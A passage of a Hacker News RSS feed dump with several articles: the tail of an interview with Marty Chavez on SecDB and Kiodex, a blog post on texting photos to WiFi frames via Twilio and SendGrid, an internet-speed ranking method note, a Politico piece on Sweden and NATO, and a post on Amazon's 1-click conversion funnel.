<p><span>How do I know that? Well, because my officemate, who shared a little cubicle with me, who's vastly more successful, got the same letter. He and I were both working on machine learning, we were both really depressed because the compute power was too low. We were looking for other things. He had the bright idea of applying machine learning to help people figure out what movie to watch. And of course my office mate was Reed Hastings, founder of Netflix.&nbsp;</span></p>
<p><span>Anyway, I went to Goldman. I joined this crazy group of three people who had this ambition of building a single piece of software where you could put all the trades, all the time series, all the models, all the risks, all the reports for Goldman Sachs. Which was a crazy aspiration because we barely had the buy-in for the foreign exchange business, barely.&nbsp;</span></p>
<p><span>Armen would tell us, "Just pretend you're doing things for the foreign exchange business, but you're actually going to be building this core infrastructure that's going to be so powerful, it's going to let us ask counterfactual questions like what if dollar-yen were here. But if interest rates were there, and it's going to tell us the answer, and that's going to give us an edge. " That was Armen's vision and we were executing on it.&nbsp;</span></p>
<blockquote>
<h2><i><span>â€œLook around and make promises to important people that are going to make their lives better, and then deliver on that. I've found if you do that, that's the best marketing.â€ - Marty Chavez</span></i></h2>
</blockquote>
<p><span>So I arrive at Goldman and they say, "Would you please write an object-oriented transaction-protected distributed database in C from scratch?" I thought that was completely crazy. I don't know, I was fortunate or unfortunate. I took a lot of computer science classes, basically absolutely every topic, except databases. Maybe if I'd taken a database course I would have known what a quixotic ambition it was to do this, but I didn't know any better. That became the server for secDB.</span></p>
<p><span>Nowadays, and this gets to your question, Gregory, we would recognize what the team built as DynamoDB, it's very similar to Amazon Web Service's DynamoDB, but it didn't exist in '93, so we wrote it. We needed a scripting language where people on the trading desk could ask questions and get answers and do numerical analysis. There was no Java, there was no Python, there was nothing, so we wrote something called Slang. Again and again, we wrote all this stuff that just didn't exist. If I were doing it now, it's an amazing time to start this now. I was thinking about dependency graphs, so I found a beautiful dependency graph, open source package in Julia that does way more than what we ever did with SecDB. It's amazing that you can now build on top of open source at an abstraction level â€” itâ€™s just light years beyond what we had in '93. Now it really becomes a software stack selection problem, which is hard in its own right.&nbsp;</span></p>
<p><b>Gregory Ugwi: When I go through your resume and you talk about secDB, and then Slang, and then you just keep going, it does seem like you just had success after success. Was there any point in your career where you failed?&nbsp;</b></p>
<p><b>Marty Chavez:</b><span> Oh, yeah. Absolutely. So it's biased, youâ€™ll see more if you Google me. Be careful about anything you read on the internet. More is written on the things that worked well than the things that didn't, I don't know why. I learned a lot more from the things that didn't work well. As an example, your roommate mentioned Kiodex. Was it a success, was it a failure? It failed, and then it didn't make me billions of dollars, but it succeeded in that it was one of a tiny handful, maybe 1%, of software companies founded in 2000 that returned money to investors. Almost everything was a complete flameout from that vantage, why? Because they raised money at the height of the dot-com bubble. So I don't know, are we in a bubble now? Who knows. But here's what I learned from that experience: don't believe any hype, especially your own, and certainly not the market hype.&nbsp;</span></p>
<p><span>When I started that company with almost no effort, I raised $15 million practically overnight. It was straight downhill from there. That was the high point of the company, because the dot-com bubble burst a week after I raised that money and it became almost impossible for the next four years to raise any money at any terms. Yet why do I think of it as a success? Well, it was because we returned money to investors, and my co-founders and I all went on to do interesting things. One of them is a senior partner at Goldman, another one is a US Congressman from the State of New York, another went on to become president of the New York Stock Exchange. We all did interesting stuff and Kiodex really got us going.&nbsp;</span></p>
<p><span>Why it was especially valuable is that we had raised some money, and we had to build some software that got to cash flow break even with real cash paid by real customers who had the unbearable pain that only we could solve. All the hype went away, and we just had the hard reality of selling subscription enterprise software in a time when no one had heard of the term SaaS â€” the term SaaS did not exist. We had to invent all of that and invent all the software, and the software had to work and it had to be on time and on budget. That terrible ruthless discipline was what I brought with me when I rejoined Goldman Sachs after Kiodex. I had the opportunity, and you were the victim of it, to apply that kind of ruthless methodology of getting software done on time at the scale of Goldman Sachs. So that's something I learned immensely from. I learned how to sell enterprise software. I would say I learned more lessons from that.&nbsp;</span></p>
<blockquote>
<h2><i><span>â€œWhen it's your ego talking, it's almost always causing you to make poor choices. Well, I think it is [about] having friends and people who love you who help you calibrate to reality.â€ - Marty Chavez</span></i></h2>
</blockquote>
<p><span>Then my other lesson was the financial crisis, the collapse of 2008. That was an epic failure in every possible direction for Goldman. It was not a financial failure, but it was a reputational calamity. Digging ourselves out of that and then embracing regulation, which was something where I had a role, where I learned a lot. I was sent out to go explain our business to the regulators and build trust with the regulators at a time when that trust was completely absent. Generally, while the failures were deeply unpleasant, they were really important ingredients of later successes.&nbsp;</span></p>
<p><b>Gregory Ugwi: You hinted at the discipline that you need to have with focusing on value to your customers. How do you balance working on technically interesting problems that might be cutting edge versus more mundane tasks that move the needle commercially?</b></p>
<p><b>Marty Chavez:</b><span> I don't know if I'm the best person to answer that. I tend to have ideas that are sound with timing that is questionable, and you really need both. You can have a great idea that's too early. When I look back with the investors in Kiodex and we ask ourselves, "With perfect hindsight, what would we have done differently?" Our answer is we would have started five years later. That would â€¦</span></p></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/">https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/</a></em></p>]]>
            </description>
            <link>https://www.businessofbusiness.com/articles/goldman-sachs-marty-chavez-interview/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507133</guid>
            <pubDate>Tue, 22 Dec 2020 15:29:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Our Family Used SMS / WiFi Picture Frames to Connect During Remote Holidays]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25507078">thread link</a>) | @mjclemente
<br/>
December 22, 2020 | https://blog.mattclemente.com/2020/12/22/sharing-pictures-sms-smart-frame.html | <a href="https://web.archive.org/web/*/https://blog.mattclemente.com/2020/12/22/sharing-pictures-sms-smart-frame.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
      <div>
  
  <p><span>22 Dec 2020</span></p><p>Two days before Thanksgiving, I decided to put together a simple way for our family to share pictures, because we couldnâ€™t be together in person. The idea: smart photo frames that everyone could text pictures to. Hereâ€™s how I got it working.
<!--more--></p>

<p><strong>tldr;</strong> A <a href="https://pipedream.com/@mjclemente/sms-pictures-to-email-p_wOCgyw1">Pipedream workflow</a> parses SMS messages sent to a Twilio phone number, extracting the pictures and then using SendGrid to email them to the dedicated email addresses used by our Pix-Star photo frames.</p>

<ul id="markdown-toc">
  <li><a href="#background" id="markdown-toc-background">Background</a></li>
  <li><a href="#the-goal" id="markdown-toc-the-goal">The Goal</a></li>
  <li><a href="#prerequisites" id="markdown-toc-prerequisites">Prerequisites</a></li>
  <li><a href="#setting-up-the-workflow" id="markdown-toc-setting-up-the-workflow">Setting Up the Workflow</a>    <ul>
      <li><a href="#pix-star-frames-setup" id="markdown-toc-pix-star-frames-setup">Pix-Star Frames Setup</a></li>
      <li><a href="#twilio-phone-number" id="markdown-toc-twilio-phone-number">Twilio Phone number</a></li>
      <li><a href="#pipedream-workflow" id="markdown-toc-pipedream-workflow">Pipedream Workflow</a></li>
    </ul>
  </li>
  <li><a href="#problems-and-limitations" id="markdown-toc-problems-and-limitations">Problems and Limitations</a></li>
  <li><a href="#wrapping-it-up" id="markdown-toc-wrapping-it-up">Wrapping it up</a></li>
</ul>
<h2 id="background">Background</h2>

<p>I come from a large family and while weâ€™re scattered across the country, most of us usually make it home for Thanksgiving. Not this year, thanks to COVID.</p>

<p>So, I was looking for something to connect four generations of people with wildly differing degrees of technological savviness and engagement. Some use Android, others iOs; some are on social media, others arenâ€™t. And I have no idea what the cool kids are using to share photos now.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup></p>

<p>Text messages (SMS) seemed like the best candidate to bridge the platform/technology divide. But just sharing images in a group chat would be really disruptive on a holiday - phones buzzing non-stop, everyone constantly looking down at them. Digital photo frames, silently updating to include the latest pictures, appeared a promising solution, though Iâ€™d never used one before.</p>

<h2 id="the-goal">The Goal</h2>

<p>Hereâ€™s the setup I was aiming for:</p>

<ul>
  <li>Every household gets a picture frame.</li>
  <li>A phone number is shared with everyone. This is the â€œShared Photosâ€ number.</li>
  <li>Pictures texted to the Shared Photos number show up on all the frames automatically.</li>
  <li>Everyone enjoys their day, occasionally stopping to see the new pictures that others have shared.</li>
</ul>

<p>The problem to be solved, then, was how to get the pictures from the text messages to the frames.</p>

<p>While the resulting flow is far from perfect (see the <a href="#problems-and-limitations">shortcomings</a> below), our family genuinely enjoyed using it, finding new pictures on the frames to be an ongoing source of delight throughout the day (and afterward).</p>

<h2 id="prerequisites">Prerequisites</h2>

<p>Hereâ€™s whatâ€™s needed to get this picture-sharing process up and running:</p>

<ul>
  <li><strong>Wifi-enabled picture frames</strong>:<br>
  It seems that wifi picture frames are still fairly novel; there are a handful of options on Amazon, with varying degrees of credibility and functionality. I didnâ€™t have a lot of time to do research, so at the <a href="https://www.tomsguide.com/best-picks/best-digital-photo-frames">recommendation of Tomâ€™s Guide</a>, I went with <a href="https://www.pix-star.com/">Pix-Star photo frames</a>,  as it was clear that I could at least email photos to them.<sup id="fnref:2" role="doc-noteref"><a href="#fn:2">2</a></sup></li>
  <li><strong>Twilio account with phone number</strong>:<br>
  No surprise here; Twilio handles the SMS portion of the workflow. Youâ€™ll need a paid account, so that you can <a href="https://support.twilio.com/hc/en-us/articles/223135247-How-to-Search-for-and-Buy-a-Twilio-Phone-Number-from-Console">buy a number</a> (it seems that most cost about $1/month); donâ€™t forget to make sure that the number supports SMS and MMS. Thereâ€™s no need to configure it yet; that will happen automatically when we add it as a source in Pipedream.</li>
  <li><strong>SendGrid account</strong>:<br>
  You could really use any API based email provider here. SendGrid has a free tier that includes up to 100 emails a day, which should be sufficient for a lot of family-image sharing purposes.</li>
  <li><strong>Pipedream account</strong>:<br>
  Iâ€™ve <a href="https://blog.mattclemente.com/2020/09/06/pipedream-uptime-monitoring.html#some-pipedream-context">written about Pipedream</a> before. Itâ€™s a developer-friendly service (with a generous free tier). In this case, Pipedream is what makes the whole picture-sharing workflow possible, because itâ€™s where weâ€™ll write the SMS-to-email translation.</li>
</ul>

<h2 id="setting-up-the-workflow">Setting Up the Workflow</h2>

<h3 id="pix-star-frames-setup">Pix-Star Frames Setup</h3>

<p>The first thing youâ€™ll need to do is set up the picture frames. I had the them shipped to family members, who then sent me the frame serial numbers, which I needed to set up the accounts with Pix-Star.</p>

<p>I donâ€™t want to get too far into the weeds with the Pix-Star frame setup, but there are some important points to cover:</p>

<ul>
  <li>Each frame gets its own account with Pix-Star, and the first step in setting up an account is picking the frameâ€™s email address. These email addresses are the key to sending emails to the frames.</li>
  <li>You can manage a group of frames via a multi-frame account. More info on that <a href="https://pixstar.uservoice.com/knowledgebase/articles/217397-how-can-i-manage-several-pix-star-frames-from-one">here</a>. Itâ€™s not necessary, but it is convenient.</li>
  <li>In order to send pictures to all the frames, youâ€™ll need either a multi-frame account email address (example.group@mypixstar.com) or the email addresses of all the individual frames.</li>
  <li>The frames should be configured to accept new pictures automatically and their slideshows switched to â€œPlay the Inbox Photosâ€ (that is, the ones they receive via email). These updates can be made via the web and donâ€™t require access to the frames.<sup id="fnref:3" role="doc-noteref"><a href="#fn:3">3</a></sup></li>
</ul>

<h3 id="twilio-phone-number">Twilio Phone number</h3>

<p>Twilio provides a <a href="https://support.twilio.com/hc/en-us/articles/223135247-How-to-Search-for-and-Buy-a-Twilio-Phone-Number-from-Console">guide for buying phone numbers</a>, so I wonâ€™t retype those instructions here.</p>

<p>I found it helpful to create a contact in my phone associated with the Twilio number for this project (I even added a picture). Having a contact makes it easier to send pictures to the number from your phoneâ€™s camera roll, as well as share the number/contact with family members.</p>

<h3 id="pipedream-workflow">Pipedream Workflow</h3>

<p>Hereâ€™s the <a href="https://pipedream.com/@mjclemente/sms-pictures-to-email-p_wOCgyw1">Pipedream workflow for converting Twilio SMS pictures to SendGrid email attachments</a>. If youâ€™re logged into Pipedream, you should see an option to copy this into your account. Once copied into your account, there are a few more steps required before you can actually use the workflow.</p>

<p>First, youâ€™ll first need to connect your Twilio account. Pipedream provides instructions regarding what information is required. Note that youâ€™ll only need a standard API key.</p>

<p>Once youâ€™ve linked Twilio, youâ€™ll need to select the number from your account that you want to use as the workflow trigger. That is, when an SMS is received at this number, the workflow will be run, with the message content available as input. To complete the trigger, youâ€™ll also need to enter your Twilio Auth Token; the â€œSMS Response Messageâ€ field can be left blank. Finally, give it a name (like â€œFamily Incoming SMSâ€) and click Create Source. This takes a few seconds to complete,</p>

<p>Youâ€™re not quite done with this step yet; the trigger is created, but you also need to enable it. This is done by toggling the On/Off button on the top right of the trigger card. Once enabled, the workflow is ready to run for new events (SMS messages).</p>

<p>Youâ€™ll then need to connect SendGrid. This is a matter of <a href="https://sendgrid.com/docs/ui/account-and-settings/api-keys/#creating-an-api-key">creating a new API key</a> to allow Pipedream access to use your SendGrid account. This API key only needs Restricted Access (full access to â€œMail Sendâ€).</p>

<p>Finally, with SendGrid connected, you just need to fill in the parameters required to send the email:</p>

<ul>
  <li><strong>To email</strong>: Either your multi-frame account email address or a comma separated list of the email addresses of all the individual frames.</li>
  <li><strong>Subject</strong>: This is being sent to the frame email address, so itâ€™s not visible, but it is required. Iâ€™m currently using â€œNew Picture from {{steps.trigger.event.From}}â€.</li>
  <li><strong>From email</strong>: An email address that youâ€™ve verified with SendGrid (or from a domain that youâ€™ve verified).<sup id="fnref:4" role="doc-noteref"><a href="#fn:4">4</a></sup></li>
  <li><strong>Type</strong>: Just set it to â€œtext/plainâ€.</li>
  <li><strong>Value</strong>: This is the body of the email, and as with the Subject, it isnâ€™t really being used, but it is required. I set it to â€œMore pictures have been shared by {{steps.trigger.event.From}}â€.</li>
</ul>

<p>You can then Save the workflow, and then Deploy it. Youâ€™re ready to give it a test! Text a picture to the Twilio/Shared Photos number that you set up and it should, in a matter of minutes, appear on all the photo frames. Honestly, it was a bit of a rush the first time it worked for me.</p>

<h2 id="problems-and-limitations">Problems and Limitations</h2>

<p>This flow for handling the SMS picture-to-frame was put together quickly, and has a handful of obvious shortcomings. While some are fixable, with a bit more work, others are just inherent in the process:</p>

<ul>
  <li>
    <p><strong>Frames are expensive</strong>. No real way around this. You might try to cut costs a little with repurposed tablets, but I didnâ€™t have enough time to explore that route.</p>
  </li>
  <li>
    <p><strong>Frame software problems</strong>. As mentioned above, we used Pix-Star photo frames. And while the process worked, there were two issues worth noting:</p>

    <ul>
      <li>First, we found that an occasional photo would not make it to all the frames. I reached out to the Pix-Star support, who were very nice, but had not idea why this was happening and were not able to resolve it. Definitely a source of frustration.</li>
      <li>Second, the Pix-Star interface was less than ideal, which made it difficult to manage the frames/pictures from the web. Along with being a bit slow and clunky, there was no way to make sure that the frame and web stayed in sync - a photo could be deleted on the web, but remain on the frame.</li>
    </ul>

    <p>Iâ€™m not sure how the experience would be different with other frame providers.</p>
  </li>
  <li>
    <p><strong>Picture quality is reduced.</strong> Because weâ€™re sending MMS, network carriers limit the size of the message/files. So, a 3MB photo from your phone might end up compressed to 800KB by the carrier. Consequently, itâ€™s best to only send one picture at a time.<sup id="fnref:5" role="doc-noteref"><a href="#fn:5">5</a></sup></p>

    <p>Now, I should note that we didnâ€™t find this to be a problem. While lower quality than the originals, the resulting images were good enough for the size they were displayed at, especially in collage-mode.</p>
  </li>
  <li>
    <p><strong>Workflow doesnâ€™t delete the images from Twilio.</strong> I havenâ€™t gotten around to including this step in the workflow. <a href="https://www.twilio.com/docs/sms/tutorials/how-to-receive-and-download-images-incoming-mms-node#delete-media-from-twilio">Itâ€™s possible</a>, but I was rushed, and this seemed the least important thing to implement. Just keep it in mind. I believe theyâ€™re automatically deleted after 13 months, and there are also tools that use the Twilio API to automate the process.</p>
  </li>
</ul>

<h2 id="wrapping-it-up">Wrapping it up</h2>

<p>Not much else to say here, except that our family enjoyed this so much that weâ€™ve continued to use the SMS-to-frame sharing, even after Thanksgiving. Weâ€™ve kept the frames up, and while weâ€™re not sending pictures as frequently as we did on the holiday, sharing little moments of daily life is still delightful.</p>

<hr>



</div>


	



    </div></div>]]>
            </description>
            <link>https://blog.mattclemente.com/2020/12/22/sharing-pictures-sms-smart-frame.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507078</guid>
            <pubDate>Tue, 22 Dec 2020 15:25:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[US is 23rd worldwide for internet speed, UK 31st, according to user speed tests]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 2 (<a href="https://news.ycombinator.com/item?id=25507060">thread link</a>) | @mootothemax
<br/>
December 22, 2020 | https://fairinternetreport.com/research/internet-speed-by-country | <a href="https://web.archive.org/web/*/https://fairinternetreport.com/research/internet-speed-by-country">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><div><p>We analyzed the Web100, NDT5, and NDT7 datasets from <a href="https://www.measurementlab.net/">Measurement Lab</a> - excluding "noisy" results, including those from Cellular connections via <a href="https://www.maxmind.com/en/geoip2-connection-type-database">MaxMind's Connection Type database</a>, and results slower than 10kbps - using <a href="https://cloud.google.com/bigquery">Google BigQuery</a>, creating a custom set of speed test data broken down by region, country and city, covering the years 2019 and 2020. </p><p> Counties with fewer that 5,000 tests/year were excluded from our rankings; we consider 5,000 tests/yeat to be a low bar for country statistics to cross, and that any counties with fewer tests could not be reliably ranked. </p><p> The custom dataset was imported into Microsoft SQL Server for rapid-access querying, and the resulting graphs used on this page were created in <a href="http://www.visualdatatools.com/DataGraph/">DataGraph</a>. </p></div></div></div></div></div>]]>
            </description>
            <link>https://fairinternetreport.com/research/internet-speed-by-country</link>
            <guid isPermaLink="false">hacker-news-small-sites-25507060</guid>
            <pubDate>Tue, 22 Dec 2020 15:24:23 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sweden edges closer to NATO membership]]>
            </title>
            <description>
<![CDATA[
Score 87 | Comments 145 (<a href="https://news.ycombinator.com/item?id=25506945">thread link</a>) | @Tomte
<br/>
December 22, 2020 | https://www.politico.eu/article/sweden-nato-membership-dilemma/ | <a href="https://web.archive.org/web/*/https://www.politico.eu/article/sweden-nato-membership-dilemma/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
									
							<div id="amazon-polly-audio-table">
				<p>Press play to listen to this article</p>
				
		</div>
<p>STOCKHOLM â€” Sweden is rethinking its security, and whether it really is safest outside NATO.</p>



<p>Two years out from the next election, debate over whether to join the Western defense alliance is intensifying, setting up a left-versus-right clash on the question in 2022.&nbsp;</p>



<p>The current minority government of Social Democrats and Greens â€” plus their allies the Left Party â€” remain staunchly against, citing the value of neutrality in what they see as a polarizing world.</p>



<p>On the other side, four traditionally allied center-right parties â€” the Moderate Party, the Liberals, the Center Party and the Christian Democrats â€” are in favor, saying Sweden needs the security of the defense guarantees that NATO membership offers.&nbsp;</p>



<p>The pro-NATO side scored a big win last week when the far-right Sweden Democrats, who are angling for closer cooperation with the center-right bloc in a range of policy areas, reversed a previous anti-NATO stance and backed a motion for Sweden to adopt a so-called NATO option â€” allowing it to join NATO at some point in the future.&nbsp;Parliament voted in favor of the motion by 204 votes to 145.&nbsp;</p>



<p>â€œIssues of defense donâ€™t normally sit high on the agenda in elections here, but since the Sweden Democrats have now moved their position, we could well see more interest,â€ said Allan Widman, a lawmaker with the Liberal Party and spokesman on defense policy.&nbsp;</p>



<p>Adopting a â€œNATO optionâ€ is not a commitment to join â€” Finland has had such an option since 1995 and remains outside the pact â€” but is widely seen as a movement in that direction. The government has acknowledged as much by so far refusing to act on it.&nbsp;</p>



<p>Foreign Minister Ann Linde called parliamentary backing for the move â€œa significant negative event for Swedish security.â€</p>



<p>For Sweden, joining NATO would be a big policy shift, as it would end more than 200 years of official military neutrality. The country has not formally taken sides in a war since Napoleon was advancing across Europe, and has over recent years sought to carve out a diplomatic role as an impartial international arbiter while at the same time developing a closer partnership with NATO.&nbsp;</p>



<p>Swedish NATO membership would also shake up a delicate balance of power in the volatile Baltic Sea region, where officially unaligned Sweden and Finland and NATO members Denmark, Germany, Poland and the Baltic states regularly face off against Russia.&nbsp;</p>



<p>In August, Sweden <a rel="noreferrer noopener" href="https://www.politico.eu/article/security-alert-sweden-gotland-cold-war-memories/" target="_blank">deployed</a> troops to its Baltic island of Gotland after a security scare triggered by Russian warships sailing close to the island.&nbsp;</p>



<p>Russian military jets regularly enter Swedish airspace without permission and many pointed the finger at Russia when a mysterious submarine was detected in waters close to the capital Stockholm in 2014.</p>



<p>Analysts say that last weekâ€™s vote in the Swedish parliament on the NATO option likely signals the start of a new phase in the wrangling over full entry into the alliance.&nbsp;</p>



<p>â€œWe can now expect a more comprehensive political debate about an eventual Swedish membership,â€ Calle HÃ¥kansson, an analyst at the think tank the Swedish Institute of International Affairs, told public service television.&nbsp;</p>



<p>The arguments of both sides are already clear. The Social Democratsâ€™ resistance is based on a long-held belief that Swedenâ€™s â€œfreedom from alliances,â€ as the party calls it, has served the country well.&nbsp;</p>



<p>Defense Minister Peter Hultqvist has engineered a range of joint training exercises with NATO, such as the cold weather <a rel="noreferrer noopener" href="https://shape.nato.int/news-archive/2019/nato-allies-participate-in-swedish-exercise-northern-wind" target="_blank">exercise </a>Northern Wind in Sweden in March 2019, but at every turn, he has sought to underline Swedish independence.</p>



<p>The Social Democrats say that joining NATO would represent unnecessary antagonization of Russia, and risk destabilizing an already tense security situation along Europeâ€™s eastern flank.&nbsp;</p>



<p>â€œWe donâ€™t want to go down a road of security policy experiments or adventurism,â€ Hulqvist <a href="https://www.dn.se/debatt/m-tycks-vara-ensidigt-fokuserade-pa-nato-medlemskap/" target="_blank" rel="noreferrer noopener">wrote</a> in an editorial in August.&nbsp;</p>



<p>Meanwhile, Widman, of the pro-NATO Liberals, said Swedenâ€™s strategy has left it in a security â€œno-manâ€™s land,â€ viewed by Russia as part of the â€œEuropean security systemâ€ but lacking the guarantee of the NATO membersâ€™ commitment to mutual defense.</p>



<p>â€œThat is a very dangerous position to find yourself in,â€ he said.&nbsp;</p>



<p>While public support for NATO membership in Finland has remained low and steady, in Sweden it has been rising.&nbsp;</p>



<p>Research by Gothenburg Universityâ€™s SOM Institute <a rel="noreferrer noopener" href="https://www.gu.se/sites/default/files/2020-06/7.%20Swedish%20trends%20%281986-2019%29_v2.pdf" target="_blank">shows</a> roughly equal support (around 30 percent) for joining NATO as those opposed. In 1994, when the SOM Institute began researching the question, 48 percent said joining was a bad idea versus 15 percent in favor.&nbsp;</p>



<p>How the issue develops will depend on the rival sidesâ€™ abilities to convince voters ahead of the 2022 vote. If the pro-NATO side does well at the polls and knock the minority center-left incumbents out of power, they could push for a referendum on the question, experts say.&nbsp;</p>



<p>Moderate Party leader Ulf Kristersson has previously said that he believes Sweden will be a member of NATO before the decade is out and he called the NATO option vote â€œhistoric.â€ In a social media <a rel="noreferrer noopener" href="https://www.instagram.com/p/CIkl1Cdp4IU/" target="_blank">post</a>, he said it would allow Sweden to â€œupdate and modernizeâ€ its security stance and tell the world that Sweden is ready to join NATO at a future point of its choosing.</p>



<p>â€œA government canâ€™t just look away from a parliamentary majority view in a foreign policy or security question,â€ he said. â€œWe expect the government to get behind the parliamentâ€™s security policy line.â€</p>
								</div></div>]]>
            </description>
            <link>https://www.politico.eu/article/sweden-nato-membership-dilemma/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25506945</guid>
            <pubDate>Tue, 22 Dec 2020 15:12:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How Amazon increases conversions with short circuits]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25506940">thread link</a>) | @jakevoytko
<br/>
December 22, 2020 | https://notmagic.tech/posts/0002-increase-conversions-with-short-circuits | <a href="https://web.archive.org/web/*/https://notmagic.tech/posts/0002-increase-conversions-with-short-circuits">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><img alt="The little red lighthouse under the George Washington Bridge" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div><p><span>ğŸ“… <!-- -->December 22, 2020</span><span>â± <!-- -->5 minutes</span></p><div><h2>In this issue</h2>
<p>Learn how Amazon uses "1-click" purchases to shortcut their conversion funnel. Brainstorm
how you can use this principle to improve your business.</p>
<h2>Buying a Kindle book</h2>
<p>I regularly encounter two different purchase flows on Amazon: one is for physical items,
and the other for digital goods.</p>
<p>I see two buttons when I visit the listing for a physical book:</p>
<ul>
<li>"Add to cart": mark the item for purchase and continue shopping</li>
<li>"Buy now": Skip straight to checkout.</li>
</ul>
</div><div><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div></div><p>I only see a single button when I buy a digital book for Kindle: "Buy now with 1-clickÂ®"
Clicking that button purchases the item and pre-downloads it onto my device. I also have
the option to download it on my other devices.</p><div><div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async"></p></div></div><div><p>Digital downloads default to the 1-click flow because this is a better experience for users
and improves Amazon's bottom line. Before we learn how to apply this to our own business,
let's chat about conversion funnels. If you're already a conversion expert, then please
skip to the section "Why Amazon's Kindle short-circuit works," which will have an actionable
takeaway for your business.</p>
<h2>Conversion funnels 101</h2>
<p>A "funnel" is a journey that the customer takes to buy a product. The goal
is to exchange the customer's money for goods or services. When they successfully complete
a transaction, this is called a "conversion."</p>
<p>Let's look at a case study: a buyer wants to buy a physical copy of "A Promised Land" by
Barack Obama.</p>
<p>Let's say they start on Google and type, "barack obama a promised land". They
see that the top two results are for barnesandnoble.com and amazon.com. They
open up the results for barnesandnoble.com and amazon.com in different tabs to
compare. They like the Amazon result better, so they close the Barnes and Noble
tab, add the book to their cart, go through the checkout flow, and purchase it.</p>
<p>Both sites have a "funnel" consisting (approximately) of the following actions the user
must perform to successfully convert:</p>
<ul>
<li>The user searches search for a book.</li>
<li>They click the search result, entering the site.</li>
<li>They select the quantity and variation and clicks "Add to cart".</li>
<li>They navigate to the cart.</li>
<li>They enter (or confirm) their address and payment method.</li>
<li>They click "check out" and successfully complete the order.</li>
</ul>
<p>In this example, the user bounces from barnesandnoble.com on the third step (they never
add to cart), but the user goes through the full flow to convert on amazon.com.</p>
<p>Users will drop off at every step. Sometimes you don't have control over this: users learned
enough about the item that they realized they didn't want it. You were never going to get
this sale.</p>
<p>Sometimes you can influence the outcome: many users want to complete the purchase
but fail because it takes too long. Imagine a major distraction, like a toddler charging
into a room and demanding attention by screaming. You are racing against this toddler when
you have a conversion flow. The user has to convert before their attention is ripped from
them.</p>
<p>Anyways, let's add some hypothetical numbers to this purchasing flow.</p>
</div><div><table><thead><tr><th>Step</th><th>Conversion Rate</th><th>Users after step</th></tr></thead><tbody><tr><td>See the link in search</td><td>1</td><td>1000</td></tr><tr><td>Click on search results</td><td>0.2</td><td>200</td></tr><tr><td>Add to cart</td><td>0.4</td><td>80</td></tr><tr><td>Go to cart</td><td>0.8</td><td>64</td></tr><tr><td>Enter information</td><td>0.9</td><td>57</td></tr><tr><td>Check out</td><td>0.95</td><td>54</td></tr></tbody><caption>54<!-- --> of 1000 users convert in this hypothetical funnel</caption></table></div><div><p>Out of 1000 searchers and 200 site visitors, we're saying that 27% of people who visit the
site will convert. I don't have good intuition for whether this number would be "good" or
"bad" for Amazon for this particular flow, but it would be shockingly high for many sites.
But this particular flow is high-intent, since the buyer intends to purchase a specific
book right now. Different visits have different levels of intent. Buyers who land on a
specific offering from search have higher intent to buy than someone browsing recently
published books.</p>
<p>There's a consolation prize for conversion funnels, and it's that buyers are more
likely to buy as they progress through the funnel. I modeled this as the rate
going strictly up. This won't be true for all (or maybe most) funnels, but the specifics
don't matter much for the lesson here.</p>
<h2>Why Amazon's Kindle digital short-circuit works</h2>
<p>The 1-click button skips the "add to cart", "go to cart", and "complete checkout" steps.
Even if these steps have extremely high conversion rates, their conversion rate is even
better when you just skip them entirely.</p>
<p>This speaks to the difference between digital and physical goods. It's easy
to imagine failure modes for physical goods. When you purchase an item, Amazon
must create a plan for moving a real item from the warehouse where it started
to your house. If it's in transit, and you decide that you don't want it anymore,
they can't just say "nevermind." It's hard to walk back from it being on a shipping truck
across the country. On the other hand, digital downloads are ephemeral. It's not
a big deal if someone asks for a refund. Amazon can verify that they didn't
download the item (or they didn't even open the book on Kindle,) then they can
just cancel the transaction and almost pretend like nothing happened.</p>
<p>"1-click" is a tremendous shortcut. It means that anyone who signals intent to purchase by
clicking "Buy now" will be more likely to convert. You almost always win the race against
the screaming toddler.</p>
<p>Let's say that 5% fewer people click the "1-click" button when it's an instant purchase.
After all, some people use their shopping carts as a bookmark folder and have no intention
of buying the item.</p>
</div><div><table><thead><tr><th>Step</th><th>Conversion Rate</th><th>Users after step</th></tr></thead><tbody><tr><td>See the link in search</td><td>1</td><td>1000</td></tr><tr><td>Click on search results</td><td>0.2</td><td>200</td></tr><tr><td>Click Buy Now</td><td>0.35</td><td>70</td></tr></tbody><caption>70<!-- --> of 1000 users convert in this hypothetical funnel</caption></table></div><div><p>About 16 more conversions than before. This doesn't sound like much. But realize
that this particular journey would have a <strong>29% conversion rate improvement</strong> using a "Buy
now" checkout with these particular numbers. Even if the rate weren't as high (maybe people
are less likely correct a failed payment in this mode, maybe more people ask for refunds
because of misclicks, maybe many fewer people will click it), it's still likely to be a
substantial win in this particular path because you have 29% to play with.</p>
<p>In fact, this principle works so well that they use it in their physical checkout flow! Go
look again. The "Buy it now" button also skips the "Add to cart" step. Amazon really wants
to shave off steps whenever possible, even if it requires giving the user extra choices.</p>
<h2>Twitter summary thread</h2>
